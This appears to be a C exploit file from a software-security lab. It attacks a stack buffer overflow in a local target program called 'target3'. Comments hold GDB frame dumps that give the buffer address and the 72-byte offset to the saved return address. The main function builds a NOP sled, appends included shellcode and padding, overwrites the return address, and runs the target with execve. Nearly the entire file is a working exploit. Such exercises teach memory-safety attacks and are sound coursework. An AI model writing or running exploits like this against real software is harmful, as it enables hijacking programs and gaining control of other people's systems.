#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"

/*(gdb) info foo
Stack level 0, frame at 0x2021ff00:
rip = 0x400c2a in foo (target3.c:24); saved rip = 0x400cba
called by frame at 0x2021ff30
source language c.
Arglist at 0x2021fef0, args: arg=0x7fffffffe2ec "test"
Locals at 0x2021fef0, Previous frame's sp is 0x2021ff00
Saved registers:
rbp at 0x2021fef0, rip at 0x2021fef8
*/
//targ is 0x2021fe70

/* info bar
Stack level 0, frame at 0x2021fea0:
 rip = 0x400bb6 in bar (target3.c:10); saved rip = 0x400c50
 called by frame at 0x2021ff00
 source language c.
 Arglist at 0x2021fe90, args: arg=0x7fffffffe2ec "test", 
    targ=0x2021feb0 "AAAA", ltarg=88
 Locals at 0x2021fe90, Previous frame's sp is 0x2021fea0
 Saved registers:
  rbp at 0x2021fe90, rip at 0x2021fe98

*/

//buffer is at 0x2021feb0
//arg is at 0x2021fea8

//return address to buffer is 72 bytes



int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];
	char tmp[77];
	int i;
	

	tmp[0] = '\x90';
	tmp[1] = '\x90';
	tmp[2] = '\x90';
	tmp[3] = '\x90';
	tmp[4] = '\x90';
	tmp[5] = '\x90';
	tmp[6] = '\x90';
	tmp[7] = '\x90';
	

	strcat(tmp,shellcode);
	
	for (i=53;i<72;i++){
		tmp[i] = '\x90';
	}
	
	tmp[72]='\x70';
	tmp[73]='\xfe';
	tmp[74]='\x21';
	tmp[75]='\x20';
	tmp[76]='\x00';
	

	args[0] = TARGET;
	args[1] = tmp;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
